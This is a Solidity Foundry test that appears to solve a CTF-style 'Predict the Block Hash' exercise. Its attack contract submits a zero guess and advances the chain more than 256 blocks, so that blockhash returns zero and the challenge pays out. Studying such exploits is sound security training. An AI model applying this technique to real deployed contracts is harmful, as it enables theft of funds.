// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {PredictTheBlockHashChallenge} from "../../src/1-Lotteries/6-PredictTheBlockHash.sol";

contract PredictTheBlockHashTest is Test {
    address challengeAddress;

    function setUp() public {
        PredictTheBlockHashChallenge challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        challengeAddress = payable(address(challenge));
    }

    function testSolvePredictTheBlockHash() public {
        PredictTheBlockHashChallenge challenge = PredictTheBlockHashChallenge(payable(challengeAddress));

        // [START]

        // 1. Deploy attack contract
        PredictTheBlockHashAttack attacker = new PredictTheBlockHashAttack(address(challenge));

        vm.deal(address(attacker), 1 ether);

        // 2. Lock in guess
        attacker.lockInGuess{value: 1 ether}();

        // 3. Settle
        // 40s: Block Information https://ethereum.github.io/yellowpaper/paper.pdf
        vm.roll(block.number + 258);
        attacker.settle();

        // [END]

        assertTrue(challenge.isComplete());
    }
}

interface IPredictTheBlockHash {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
}

// Attack contract
contract PredictTheBlockHashAttack {
    IPredictTheBlockHash target;
    bytes32 guess = 0;
    uint256 settlementBlockNumber;

    constructor(address _target) public {
        target = IPredictTheBlockHash(_target);
    }

    function lockInGuess() external payable {
        settlementBlockNumber = block.number + 1;
        target.lockInGuess{value: 1 ether}(guess);
    }

    function settle() external {
        bytes32 answer = blockhash(settlementBlockNumber);
        console.logBytes32(answer);
        require(guess == answer, "Wrong answer");
        target.settle();
    }

    receive() external payable {}
}
